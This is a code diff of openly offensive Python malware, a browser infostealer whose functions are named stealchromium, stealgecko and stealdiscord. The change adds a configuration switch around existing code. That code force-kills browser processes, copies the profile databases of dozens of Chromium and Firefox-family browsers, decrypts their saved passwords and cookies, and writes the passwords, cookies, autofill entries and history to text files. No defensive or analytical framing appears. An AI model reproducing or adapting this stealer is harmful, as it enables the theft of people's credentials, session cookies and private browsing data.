@@ -59,10 +59,11 @@ def load_nss(profile_path, nss3):
             return nss
 
 def kill():
-    exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'samsunginternet.exe', 'iridium.exe', 'vivaldi.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'shift.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
-
-    for exe in exes:
-        subprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    if config.browsers:
+        exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'samsunginternet.exe', 'iridium.exe', 'vivaldi.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'shift.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
+    
+        for exe in exes:
+            subprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
 def decrypt_firefox_password(nss, encrypted_str):
     class SECItem(ctypes.Structure):
@@ -220,244 +221,74 @@ def stealchromium():
     global password_count
     global browsing_history
     global autofill_count
-
-    chromium_paths = {
-        'Chrome': {'path': localappdata + '\\Google\\Chrome\\User Data', 'localstate': localappdata + '\\Google\\Chrome\\User Data\\Local State'},
-        'Chrome SxS': {'path': localappdata + '\\Google\\Chrome SxS\\User Data', 'localstate': localappdata + '\\Google\\Chrome SxS\\User Data\\Local State'},
-        'Chrome Dev': {'path': localappdata + '\\Google\\Chrome Dev\\User Data', 'localstate': localappdata + '\\Google\\Chrome Dev\\User Data\\Local State'},
-        'Chrome Beta': {'path': localappdata + '\\Google\\Chrome Beta\\User Data', 'localstate': localappdata + '\\Google\\Chrome Beta\\User Data\\Local State'},
-        'AVG': {'path': localappdata + '\\AVG\\Browser\\User Data', 'localstate': localappdata + '\\AVG\\Browser\\User Data\\Local State'},
-        'Chromium': {'path': localappdata + '\\Chromium\\User Data', 'localstate': localappdata + '\\Chromium\\User Data\\Local State'},
-        'Amigo': {'path': localappdata + '\\Amigo\\User Data', 'localstate': localappdata + '\\Amigo\\User Data\\Local State'},
-        'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State'},
-        'Samsung Internet': {'path': localappdata + '\\Samsung\\Internet\\User Data', 'localstate': localappdata + '\\Samsung\\Internet\\User Data\\Local State'},
-        'Supermium': {'path': localappdata + '\\Supermium\\User Data', 'localstate': localappdata + '\\Supermium\\User Data\\Local State'},
-        'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
-        'WaveBrowser': {'path': localappdata + '\\WaveBrowser\\User Data', 'localstate': localappdata + '\\WaveBrowser\\User Data\\Local State'},
-        'Helium': {'path': localappdata + '\\imput\\Helium\\User Data', 'localstate': localappdata + '\\imput\\Helium\\User Data\\Local State'},
-        'Escosia': {'path': localappdata + '\\EscosiaBrowser\\User Data', 'localstate': localappdata + '\\EscosiaBrowser\\User Data\\Local State'},
-        'Shift': {'path': localappdata + '\\Shift\\User Data', 'localstate': localappdata + '\\Shift\\User Data\\Local State'},
-        'Comet': {'path': localappdata + '\\Perplexity\\Comet\\User Data', 'localstate': localappdata + '\\Perplexity\\Comet\\User Data\\Local State'},
-        'Yandex': {'path': localappdata + '\\Yandex\\YandexBrowser\\User Data', 'localstate': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Local State'},
-        'DuckDuckGo': {'path': localappdata + '\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView', 'localstate': localappdata + '\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView\\Local State'},
-        'Comodo': {'path': localappdata + '\\Comodo\\Dragon\\User Data', 'localstate': localappdata + '\\Comodo\\Dragon\\User Data\\Local State'},
-        'Avast': {'path': localappdata + '\\AVAST Software\\Browser\\User Data', 'localstate': localappdata + '\\AVAST Software\\Browser\\User Data\\Local State'},
-        'Epic': {'path': localappdata + '\\Epic Privacy Browser\\User Data', 'localstate': localappdata + '\\Epic Privacy Browser\\User Data\\Local State'},
-        'Thorium': {'path': localappdata + '\\Thorium\\User Data', 'localstate': localappdata + '\\Thorium\\User Data\\Local State'}, 
-        'Cromite': {'path': localappdata + '\\Cromite\\User Data', 'localstate': localappdata + '\\Cromite\\User Data\\Local State'},
-        'Edge': {'path': localappdata + '\\Microsoft\\Edge\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge\\User Data\\Local State'},
-        'Edge SxS': {'path': localappdata + '\\Microsoft\\Edge SxS\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge SxS\\User Data\\Local State'},
-        'Edge Dev': {'path': localappdata + '\\Microsoft\\Edge Dev\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge Dev\\User Data\\Local State'},
-        'Brave': {'path': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data', 'localstate': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Local State'},
-        'Opera': {'path': appdata + '\\Opera Software\\Opera Stable', 'localstate': appdata + '\\Opera Software\\Opera Stable\\Local State'},
-        'Opera GX': {'path': appdata + '\\Opera Software\\Opera GX Stable', 'localstate': appdata + '\\Opera Software\\Opera GX Stable\\Local State'},
-        'Opera Air': {'path': appdata + '\\Opera Software\\Opera Air Stable', 'localstate': appdata + '\\Opera Software\\Opera Air Stable\\Local State'},
-        'Vivaldi': {'path': localappdata + '\\Vivaldi\\User Data', 'localstate': localappdata + '\\Vivaldi\\User Data\\Local State'},
-        }
-        
-    for name, path in chromium_paths.items():
-        userdata = path['path']
-        local_state = path['localstate']
-        profiles = []
-        if not os.path.exists(userdata):
-            continue
-        for prffl in os.listdir(userdata):
-            if prffl.lower() == 'default' or prffl.lower().startswith('profile'):
-                profiles.append(prffl)
+    if config.browsers:
+    
+        chromium_paths = {
+            'Chrome': {'path': localappdata + '\\Google\\Chrome\\User Data', 'localstate': localappdata + '\\Google\\Chrome\\User Data\\Local State'},
+            'Chrome SxS': {'path': localappdata + '\\Google\\Chrome SxS\\User Data', 'localstate': localappdata + '\\Google\\Chrome SxS\\User Data\\Local State'},
+            'Chrome Dev': {'path': localappdata + '\\Google\\Chrome Dev\\User Data', 'localstate': localappdata + '\\Google\\Chrome Dev\\User Data\\Local State'},
+            'Chrome Beta': {'path': localappdata + '\\Google\\Chrome Beta\\User Data', 'localstate': localappdata + '\\Google\\Chrome Beta\\User Data\\Local State'},
+            'AVG': {'path': localappdata + '\\AVG\\Browser\\User Data', 'localstate': localappdata + '\\AVG\\Browser\\User Data\\Local State'},
+            'Chromium': {'path': localappdata + '\\Chromium\\User Data', 'localstate': localappdata + '\\Chromium\\User Data\\Local State'},
+            'Amigo': {'path': localappdata + '\\Amigo\\User Data', 'localstate': localappdata + '\\Amigo\\User Data\\Local State'},
+            'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State'},
+            'Samsung Internet': {'path': localappdata + '\\Samsung\\Internet\\User Data', 'localstate': localappdata + '\\Samsung\\Internet\\User Data\\Local State'},
+            'Supermium': {'path': localappdata + '\\Supermium\\User Data', 'localstate': localappdata + '\\Supermium\\User Data\\Local State'},
+            'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
+            'WaveBrowser': {'path': localappdata + '\\WaveBrowser\\User Data', 'localstate': localappdata + '\\WaveBrowser\\User Data\\Local State'},
+            'Helium': {'path': localappdata + '\\imput\\Helium\\User Data', 'localstate': localappdata + '\\imput\\Helium\\User Data\\Local State'},
+            'Escosia': {'path': localappdata + '\\EscosiaBrowser\\User Data', 'localstate': localappdata + '\\EscosiaBrowser\\User Data\\Local State'},
+            'Shift': {'path': localappdata + '\\Shift\\User Data', 'localstate': localappdata + '\\Shift\\User Data\\Local State'},
+            'Comet': {'path': localappdata + '\\Perplexity\\Comet\\User Data', 'localstate': localappdata + '\\Perplexity\\Comet\\User Data\\Local State'},
+            'Yandex': {'path': localappdata + '\\Yandex\\YandexBrowser\\User Data', 'localstate': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Local State'},
+            'DuckDuckGo': {'path': localappdata + '\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView', 'localstate': localappdata + '\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView\\Local State'},
+            'Comodo': {'path': localappdata + '\\Comodo\\Dragon\\User Data', 'localstate': localappdata + '\\Comodo\\Dragon\\User Data\\Local State'},
+            'Avast': {'path': localappdata + '\\AVAST Software\\Browser\\User Data', 'localstate': localappdata + '\\AVAST Software\\Browser\\User Data\\Local State'},
+            'Epic': {'path': localappdata + '\\Epic Privacy Browser\\User Data', 'localstate': localappdata + '\\Epic Privacy Browser\\User Data\\Local State'},
+            'Thorium': {'path': localappdata + '\\Thorium\\User Data', 'localstate': localappdata + '\\Thorium\\User Data\\Local State'}, 
+            'Cromite': {'path': localappdata + '\\Cromite\\User Data', 'localstate': localappdata + '\\Cromite\\User Data\\Local State'},
+            'Edge': {'path': localappdata + '\\Microsoft\\Edge\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge\\User Data\\Local State'},
+            'Edge SxS': {'path': localappdata + '\\Microsoft\\Edge SxS\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge SxS\\User Data\\Local State'},
+            'Edge Dev': {'path': localappdata + '\\Microsoft\\Edge Dev\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge Dev\\User Data\\Local State'},
+            'Brave': {'path': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data', 'localstate': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Local State'},
+            'Opera': {'path': appdata + '\\Opera Software\\Opera Stable', 'localstate': appdata + '\\Opera Software\\Opera Stable\\Local State'},
+            'Opera GX': {'path': appdata + '\\Opera Software\\Opera GX Stable', 'localstate': appdata + '\\Opera Software\\Opera GX Stable\\Local State'},
+            'Opera Air': {'path': appdata + '\\Opera Software\\Opera Air Stable', 'localstate': appdata + '\\Opera Software\\Opera Air Stable\\Local State'},
+            'Vivaldi': {'path': localappdata + '\\Vivaldi\\User Data', 'localstate': localappdata + '\\Vivaldi\\User Data\\Local State'},
+            }
+            
+        for name, path in chromium_paths.items():
+            userdata = path['path']
+            local_state = path['localstate']
+            profiles = []
+            if not os.path.exists(userdata):
+                continue
+            for prffl in os.listdir(userdata):
+                if prffl.lower() == 'default' or prffl.lower().startswith('profile'):
+                    profiles.append(prffl)
+                    
+            master_key = get_master_key(local_state)
+            
+            for profile in profiles:
+                os.makedirs(os.path.join(output, name, profile), exist_ok=True)
+                cookieoutput = os.path.join(output, name, profile, 'Cookies.txt')
+                passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
+                autofilloutput = os.path.join(output, name, profile, 'Autofill.txt')
+                historyoutput = os.path.join(output, name, profile, 'History.txt')
                 
-        master_key = get_master_key(local_state)
-        
-        for profile in profiles:
-            os.makedirs(os.path.join(output, name, profile), exist_ok=True)
-            cookieoutput = os.path.join(output, name, profile, 'Cookies.txt')
-            passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
-            autofilloutput = os.path.join(output, name, profile, 'Autofill.txt')
-            historyoutput = os.path.join(output, name, profile, 'History.txt')
-            
-            profile_path = os.path.join(userdata, profile)
-            #print(profile_path)
-            
-            cookie_path = os.path.join(profile_path, 'Network', 'Cookies')
-            password_path = os.path.join(profile_path, 'Login Data')
-            autofill_path = os.path.join(profile_path, 'Web Data')
-            history_path = os.path.join(profile_path, 'History')
-            if os.path.exists(autofill_path):
-                tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-                shutil.copy2(autofill_path, tmpdir)
-                con = sqlite3.connect(tmpdir)
-                cur = con.cursor()
-                cur.execute("SELECT name, value FROM autofill")
-                try:
-                    for autofillname, val in cur.fetchall():
-                        line = f"NAME: {autofillname} \nVALUE: {val}\n---------------------------------\n"
-                        write(autofilloutput, line)
-                        autofill_count += 1
-                except Exception as e:
-                    pass
-                cur.close()
-                con.close()
-                removefile(tmpdir)
+                profile_path = os.path.join(userdata, profile)
+                #print(profile_path)
                 
-            if os.path.exists(cookie_path):
-               tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-               try:
-                   shutil.copy2(cookie_path, tmpdir)
-                   con = sqlite3.connect(tmpdir)
-                   cur = con.cursor()
-                   cur.execute("SELECT host_key, name, path, encrypted_value, is_secure FROM cookies")
-                   try:
-                       for host, c0name, c0path, value, c0secure in cur.fetchall():
-                           line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{2597573456}\t{c0name}\t{decrypt_password(value, master_key)}\n"
-                           write(cookieoutput, line)
-                           cookie_count += 1
-                   except Exception as e:
-                       pass
-                   cur.close()
-                   con.close()
-                   removefile(tmpdir)
-               except:
-                   pass
-               
-            if os.path.exists(password_path):
-               tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-               shutil.copy2(password_path, tmpdir)
-               con = sqlite3.connect(tmpdir)
-               cur = con.cursor()
-               cur.execute("SELECT origin_url, username_value, password_value FROM logins")
-               try:
-                   for host, c0name, value in cur.fetchall():
-                       if c0name and value:
-                           line = f"URL: {host}\nUSERNAME: {c0name}\nPASSWORD: {decrypt_password(value, master_key)}\n---------------------------------\n"
-                           write(passwordoutput, line)
-                           password_count += 1
-               except Exception as e:
-                   pass
-               cur.close()
-               con.close()
-               removefile(tmpdir)
-               
-            if os.path.exists(history_path):
-               tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-               shutil.copy2(history_path, tmpdir)
-               con = sqlite3.connect(tmpdir)
-               cur = con.cursor()
-               cur.execute("SELECT url, title, visit_count FROM urls")
-               try:
-                   for w3url, w3name, w3visit in cur.fetchall():
-                       line = f"Name: {w3name}\nURL: {w3url}\nVISITS: {w3visit}\n---------------------------------\n"
-                       write(historyoutput, line)
-                       browsing_history += 1
-               except Exception as e:
-                   pass
-               cur.close()
-               con.close()
-               removefile(tmpdir)
-               
-def stealgecko():
-    global cookie_count
-    global password_count
-    global browsing_history
-    global autofill_count
-    gecko_paths = {
-        "Firefox": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Mozilla Firefox\\nss3.dll"},
-        #"Firefox Developer Edition": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Firefox Developer Edition\\nss3.dll"},
-        "Waterfox": {"path": appdata + "\\Waterfox\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"},
-        "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": localappdata + "\\Mullvad\\MullvadBrowser\\Release\\nss3.dll"}, 
-        "Zen": {"path": appdata + "\\zen\\Profiles", "nss": "C:\\Program Files\\Zen Browser\\nss3.dll"}, 
-        "SeaMonkey": {"path": appdata + "\\Mozilla\\SeaMonkey\\Profiles", "nss": "C:\\Program Files\\SeaMonkey\\nss3.dll"}
-    }
-    for name, path in gecko_paths.items():
-        nss = path['nss']
-        userdata = path['path']
-        profiles = []
-        if not os.path.exists(userdata):
-            continue
-        for prffl in os.listdir(userdata):
-            if os.path.exists(os.path.join(userdata, prffl, 'cookies.sqlite')):
-                profiles.append(prffl)
-        
-        for profile in profiles:
-            os.makedirs(os.path.join(output, name, profile), exist_ok=True)
-            cookieoutput = os.path.join(output, name, profile, 'Cookies.txt')
-            passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
-            autofilloutput = os.path.join(output, name, profile, 'Autofill.txt')
-            historyoutput = os.path.join(output, name, profile, 'History.txt')
-
-            profile_path = os.path.join(userdata, profile)
-            cookie_path = os.path.join(profile_path, 'cookies.sqlite')
-            password_path = os.path.join(profile_path, 'logins.json')
-            autofill_path = os.path.join(profile_path, 'formhistory.sqlite')
-            history_path = os.path.join(profile_path, 'places.sqlite')
-            
-            if os.path.exists(cookie_path):
-               tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-               try:
-                   shutil.copy2(cookie_path, tmpdir)
-                   con = sqlite3.connect(tmpdir)
-                   cur = con.cursor()
-                   cur.execute("SELECT host, name, path, value, isSecure FROM moz_cookies")
-                   try:
-                       for host, c0name, c0path, value, c0secure in cur.fetchall():
-                           line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{2597573456}\t{c0name}\t{value}\n"
-                           write(cookieoutput, line)
-                           cookie_count += 1
-                   except Exception as e:
-                       pass
-                   cur.close()
-                   con.close()
-                   removefile(tmpdir)
-               except:
-                   pass
-                   
-            if os.path.exists(password_path):
-               tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-               try:
-                   shutil.copy2(password_path, tmpdir)
-                   _nss3 = load_nss(profile_path, nss)
-                   
-                   if _nss3:
-                       with open(tmpdir, 'r', encoding='utf-8') as f:
-                           lgns = json.load(f).get('logins', [])
-                           
-                       for login in lgns:
-                           host = login.get('hostname', '')
-                           Cusername = decrypt_firefox_password(_nss3, login.get('encryptedUsername', ''))
-                           Cpassword = decrypt_firefox_password(_nss3, login.get('encryptedPassword', ''))
-                           if Cusername and Cpassword:
-                               line = f"URL: {host}\nUSERNAME: {Cusername}\nPASSWORD: {Cpassword}\n---------------------------------\n"
-                               write(passwordoutput, line)
-                               password_count += 1
-                   removefile(tmpdir)
-               except Exception as e:
-                   pass
-            
-            if os.path.exists(history_path):
-                tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-                try:
-                    shutil.copy2(history_path, tmpdir)
-                    con = sqlite3.connect(tmpdir)
-                    cur = con.cursor()
-                    cur.execute("SELECT url, title, visit_count FROM moz_places")
-                    try:
-                        for w3url, w3name, w3visit in cur.fetchall():
-                            line = f"Name: {w3name}\nURL: {w3url}\nVISITS: {w3visit}\n---------------------------------\n"
-                            write(historyoutput, line)
-                            browsing_history += 1
-                    except Exception as e:
-                        pass
-                    cur.close()
-                    con.close()
-                    removefile(tmpdir)
-                except Exception as e:
-                   pass
-                   
-            if os.path.exists(autofill_path):
-                tmpdir = os.path.join(os.getenv('temp'), randstr(12))
-                try:
+                cookie_path = os.path.join(profile_path, 'Network', 'Cookies')
+                password_path = os.path.join(profile_path, 'Login Data')
+                autofill_path = os.path.join(profile_path, 'Web Data')
+                history_path = os.path.join(profile_path, 'History')
+                if os.path.exists(autofill_path):
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                     shutil.copy2(autofill_path, tmpdir)
                     con = sqlite3.connect(tmpdir)
                     cur = con.cursor()
-                    cur.execute("SELECT fieldname, value FROM moz_formhistory")
+                    cur.execute("SELECT name, value FROM autofill")
                     try:
                         for autofillname, val in cur.fetchall():
                             line = f"NAME: {autofillname} \nVALUE: {val}\n---------------------------------\n"
@@ -468,8 +299,180 @@ def stealgecko():
                     cur.close()
                     con.close()
                     removefile(tmpdir)
-                except Exception as e:
-                   pass
+                    
+                if os.path.exists(cookie_path):
+                   tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                   try:
+                       shutil.copy2(cookie_path, tmpdir)
+                       con = sqlite3.connect(tmpdir)
+                       cur = con.cursor()
+                       cur.execute("SELECT host_key, name, path, encrypted_value, is_secure FROM cookies")
+                       try:
+                           for host, c0name, c0path, value, c0secure in cur.fetchall():
+                               line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{2597573456}\t{c0name}\t{decrypt_password(value, master_key)}\n"
+                               write(cookieoutput, line)
+                               cookie_count += 1
+                       except Exception as e:
+                           pass
+                       cur.close()
+                       con.close()
+                       removefile(tmpdir)
+                   except:
+                       pass
+                   
+                if os.path.exists(password_path):
+                   tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                   shutil.copy2(password_path, tmpdir)
+                   con = sqlite3.connect(tmpdir)
+                   cur = con.cursor()
+                   cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                   try:
+                       for host, c0name, value in cur.fetchall():
+                           if c0name and value:
+                               line = f"URL: {host}\nUSERNAME: {c0name}\nPASSWORD: {decrypt_password(value, master_key)}\n---------------------------------\n"
+                               write(passwordoutput, line)
+                               password_count += 1
+                   except Exception as e:
+                       pass
+                   cur.close()
+                   con.close()
+                   removefile(tmpdir)
+                   
+                if os.path.exists(history_path):
+                   tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                   shutil.copy2(history_path, tmpdir)
+                   con = sqlite3.connect(tmpdir)
+                   cur = con.cursor()
+                   cur.execute("SELECT url, title, visit_count FROM urls")
+                   try:
+                       for w3url, w3name, w3visit in cur.fetchall():
+                           line = f"Name: {w3name}\nURL: {w3url}\nVISITS: {w3visit}\n---------------------------------\n"
+                           write(historyoutput, line)
+                           browsing_history += 1
+                   except Exception as e:
+                       pass
+                   cur.close()
+                   con.close()
+                   removefile(tmpdir)
+                   
+def stealgecko():
+    global cookie_count
+    global password_count
+    global browsing_history
+    global autofill_count
+    if config.browsers:
+        gecko_paths = {
+            "Firefox": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Mozilla Firefox\\nss3.dll"},
+            #"Firefox Developer Edition": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Firefox Developer Edition\\nss3.dll"},
+            "Waterfox": {"path": appdata + "\\Waterfox\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"},
+            "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": localappdata + "\\Mullvad\\MullvadBrowser\\Release\\nss3.dll"}, 
+            "Zen": {"path": appdata + "\\zen\\Profiles", "nss": "C:\\Program Files\\Zen Browser\\nss3.dll"}, 
+            "SeaMonkey": {"path": appdata + "\\Mozilla\\SeaMonkey\\Profiles", "nss": "C:\\Program Files\\SeaMonkey\\nss3.dll"}
+        }
+        for name, path in gecko_paths.items():
+            nss = path['nss']
+            userdata = path['path']
+            profiles = []
+            if not os.path.exists(userdata):
+                continue
+            for prffl in os.listdir(userdata):
+                if os.path.exists(os.path.join(userdata, prffl, 'cookies.sqlite')):
+                    profiles.append(prffl)
+            
+            for profile in profiles:
+                os.makedirs(os.path.join(output, name, profile), exist_ok=True)
+                cookieoutput = os.path.join(output, name, profile, 'Cookies.txt')
+                passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
+                autofilloutput = os.path.join(output, name, profile, 'Autofill.txt')
+                historyoutput = os.path.join(output, name, profile, 'History.txt')
+    
+                profile_path = os.path.join(userdata, profile)
+                cookie_path = os.path.join(profile_path, 'cookies.sqlite')
+                password_path = os.path.join(profile_path, 'logins.json')
+                autofill_path = os.path.join(profile_path, 'formhistory.sqlite')
+                history_path = os.path.join(profile_path, 'places.sqlite')
+                
+                if os.path.exists(cookie_path):
+                   tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                   try:
+                       shutil.copy2(cookie_path, tmpdir)
+                       con = sqlite3.connect(tmpdir)
+                       cur = con.cursor()
+                       cur.execute("SELECT host, name, path, value, isSecure FROM moz_cookies")
+                       try:
+                           for host, c0name, c0path, value, c0secure in cur.fetchall():
+                               line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{2597573456}\t{c0name}\t{value}\n"
+                               write(cookieoutput, line)
+                               cookie_count += 1
+                       except Exception as e:
+                           pass
+                       cur.close()
+                       con.close()
+                       removefile(tmpdir)
+                   except:
+                       pass
+                       
+                if os.path.exists(password_path):
+                   tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                   try:
+                       shutil.copy2(password_path, tmpdir)
+                       _nss3 = load_nss(profile_path, nss)
+                       
+                       if _nss3:
+                           with open(tmpdir, 'r', encoding='utf-8') as f:
+                               lgns = json.load(f).get('logins', [])
+                               
+                           for login in lgns:
+                               host = login.get('hostname', '')
+                               Cusername = decrypt_firefox_password(_nss3, login.get('encryptedUsername', ''))
+                               Cpassword = decrypt_firefox_password(_nss3, login.get('encryptedPassword', ''))
+                               if Cusername and Cpassword:
+                                   line = f"URL: {host}\nUSERNAME: {Cusername}\nPASSWORD: {Cpassword}\n---------------------------------\n"
+                                   write(passwordoutput, line)
+                                   password_count += 1
+                       removefile(tmpdir)
+                   except Exception as e:
+                       pass
+                
+                if os.path.exists(history_path):
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                    try:
+                        shutil.copy2(history_path, tmpdir)
+                        con = sqlite3.connect(tmpdir)
+                        cur = con.cursor()
+                        cur.execute("SELECT url, title, visit_count FROM moz_places")
+                        try:
+                            for w3url, w3name, w3visit in cur.fetchall():
+                                line = f"Name: {w3name}\nURL: {w3url}\nVISITS: {w3visit}\n---------------------------------\n"
+                                write(historyoutput, line)
+                                browsing_history += 1
+                        except Exception as e:
+                            pass
+                        cur.close()
+                        con.close()
+                        removefile(tmpdir)
+                    except Exception as e:
+                       pass
+                       
+                if os.path.exists(autofill_path):
+                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
+                    try:
+                        shutil.copy2(autofill_path, tmpdir)
+                        con = sqlite3.connect(tmpdir)
+                        cur = con.cursor()
+                        cur.execute("SELECT fieldname, value FROM moz_formhistory")
+                        try:
+                            for autofillname, val in cur.fetchall():
+                                line = f"NAME: {autofillname} \nVALUE: {val}\n---------------------------------\n"
+                                write(autofilloutput, line)
+                                autofill_count += 1
+                        except Exception as e:
+                            pass
+                        cur.close()
+                        con.close()
+                        removefile(tmpdir)
+                    except Exception as e:
+                       pass
 
 
 def stealdiscord(): #stole this from my token stealer 
